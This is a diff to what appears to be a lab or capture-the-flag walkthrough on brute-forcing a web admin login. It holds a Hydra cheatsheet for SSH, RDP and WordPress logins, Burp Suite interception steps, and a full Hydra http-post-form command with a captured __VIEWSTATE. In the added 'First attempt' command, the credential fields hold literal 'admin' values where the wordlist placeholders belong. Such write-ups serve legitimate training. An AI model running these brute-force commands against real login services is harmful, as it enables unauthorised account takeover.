@@ -101,6 +101,9 @@ Type of request:
     # curl -s http://<IP address target machine>/Account/login.aspx?ReturnURL=/admin/ | grep "<form"
         <form method="post" action="login.aspx?ReturnURL=%2fadmin%2f" id="Form1">
 
+Using Burpsuite Intruder, try a brute-force on that `admin` user. Fire up Burpsuite, go to login page, 
+set Burpsuite to intercept, and try to log in. Catch the `__VIEWSTATE` for use in Hydra.
+
 Mini hydra cheatsheet:
 
 | Command                                                                                                                                      | Description                                                                                                                                                                  |
@@ -110,10 +113,16 @@ Mini hydra cheatsheet:
 | hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>                                                                                      | Attack a Windows Remote Desktop with a password <br/>list.                                                                                                                   |
 | hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:<br/>log=^USER^&pwd=^PASS^&wp-submit=<br/>Log In&testcookie=1:S=Location' | Craft a more specific request for Hydra <br/>to brute force.                                                                                                                 |
 
-Using Burpsuite Intruder, try a brute-force on that `admin` user. Fire up Burpsuite, go to login page, 
-set Burpsuite to intercept, and try to log in. Catch the `__VIEWSTATE` for use in Hydra.
+Using the flags:
 
-    # hydra -f -l admin -P /usr/share/wordlists/rockyou.txt <IP address target machine> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=nbWrkCqQ%2B1Hn%2Fgt8OwrXb%2B%2BFMX0bVJv9xbWiO3oASE6l0%2BDl73MXEP2ao2pwbsK6Jr4MzOI9cbeVU7o5WL%2BFKDPWl1RXjt5kLGmi%2F1d9biM%2Fi3jThbmDihH1A7JWIVyWFQ3lIXAOLpqdlBKHFv6dZd8XzdjcN%2FrgmGzhog7Sf0Ml3kvolr3pzU9VlhHtBqJZNJ%2FkQVxtOT%2Bc%2FxMceQklmwd%2FeiI1sb4%2B4Mv4ol44Uy4Mf9Vaw%2B6OUiBt1BZn8PQoOcFS6ul97keSrPf2jTIqUqeC1YQwwE0FU7Syl8jfviP6nsNb4aSX6ASTDZlajXjkTtFum%2Bpk3uz4%2FtNoraPjA%2FTn5DuX56Sbr4I9oGPQznIuhjc0&__EVENTVALIDATION=pKMn8W0WIp7BuOhOq9YO49%2BqkAVDl1TJjXzk%2BDzHnOyizFWE7BYkR%2Frn983R5edqA0yBYDn%2Fi7BIxrq%2FJlxoiMHPZ2UN1iFWs83YOrgnVHxJtr4R811S4kAhpj4kb6aqZ1r9F5iqUqIoj3gfQjf%2BtO7mRTdLARthnldxPEA73U3caeMM&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
+* `-f` to stop the attack when a valid password is found
+* `-l` to specify the username for the bruteforce attack
+* `-P` to specify the wordlist to use for the bruteforce
+* `http-post-form` to specify the URL including all parameters used in the request, such as the username, password and the failed authentication message
+
+First attempt:
+
+    # hydra -f -l admin -P /usr/share/wordlists/rockyou.txt <IP address target machine> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=nbWrkCqQ%2B1Hn%2Fgt8OwrXb%2B%2BFMX0bVJv9xbWiO3oASE6l0%2BDl73MXEP2ao2pwbsK6Jr4MzOI9cbeVU7o5WL%2BFKDPWl1RXjt5kLGmi%2F1d9biM%2Fi3jThbmDihH1A7JWIVyWFQ3lIXAOLpqdlBKHFv6dZd8XzdjcN%2FrgmGzhog7Sf0Ml3kvolr3pzU9VlhHtBqJZNJ%2FkQVxtOT%2Bc%2FxMceQklmwd%2FeiI1sb4%2B4Mv4ol44Uy4Mf9Vaw%2B6OUiBt1BZn8PQoOcFS6ul97keSrPf2jTIqUqeC1YQwwE0FU7Syl8jfviP6nsNb4aSX6ASTDZlajXjkTtFum%2Bpk3uz4%2FtNoraPjA%2FTn5DuX56Sbr4I9oGPQznIuhjc0&__EVENTVALIDATION=pKMn8W0WIp7BuOhOq9YO49%2BqkAVDl1TJjXzk%2BDzHnOyizFWE7BYkR%2Frn983R5edqA0yBYDn%2Fi7BIxrq%2FJlxoiMHPZ2UN1iFWs83YOrgnVHxJtr4R811S4kAhpj4kb6aqZ1r9F5iqUqIoj3gfQjf%2BtO7mRTdLARthnldxPEA73U3caeMM&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=admin&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
 
 ## Compromise the machine 
 
